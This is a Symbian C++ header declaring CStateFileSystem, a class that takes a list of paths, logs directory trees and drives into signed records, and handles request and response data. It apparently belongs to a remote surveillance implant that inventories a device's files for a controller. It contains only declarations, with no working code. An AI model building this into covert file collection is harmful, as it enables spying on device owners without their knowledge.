/*
 * StateFileSystem.h
 *
 *  Created on: 19/feb/2011
 *      Author: Giovanna
 */

#ifndef STATEFILESYSTEM_H_
#define STATEFILESYSTEM_H_

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <f32file.h>

#include "AbstractState.h"
#include <HT\LogFile.h>




// CLASS DECLARATION
/**
 *  CStateFileSystem
 * 
 */
class CStateFileSystem : public CAbstractState
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CStateFileSystem();

	/**
	 * Two-phased constructor.
	 */
	static CStateFileSystem* NewL(MStateObserver& aObserver);

	/**
	 * Two-phased constructor.
	 */
	static CStateFileSystem* NewLC(MStateObserver& aObserver);

	virtual void ActivateL(const TDesC8& aData);
	virtual void ProcessDataL(const TDesC8& aData);
	
private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CStateFileSystem(MStateObserver& aObserver);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL();

	
	/*
	 * Log the required paths.
	 * aPathList:
	 * numDir | depth1 | dir1 | depth2 | dir2 | ... 
	 * # numDir: numero di coppie depth e dir da leggere, INT
	 * # depth(n): profondita' di ricerca della directory ennesima, INT
	 * # dir(n): percorso della directory ennesima, UTF16-LE PASCAL Null-Terminated 
	 */
	void LogFilesystemL(const TDesC8& aPathList);
	/*
	 * Log the file system tree starting from a given aPath and for aLevel down 
	 */
	void LogTreeL(RFs& aFs,const TDesC& aPath, TInt aLevel);
	
	/*
	 * Log the availables drives (special case)
	 */
	void LogDrives(RFs& aFs);
	
	/*
	 * Construct record log data for general path
	 */
	HBufC8* GetPathBuffer(TEntry aEntry, const TDesC& aParentPath);

	/*
	 * Construct record log data for drives
	 */
	HBufC8* GetDriveBuffer(const TDesC& aDrivePath);
	
private:
	
	TBuf8<16>		iSignKey;
	
	HBufC8*			iRequestData;
	HBufC8*			iResponseData;
	
	RFs				iFs;
	CLogFile*		iLogFs;
	};

#endif /* STATEFILESYSTEM_H_ */
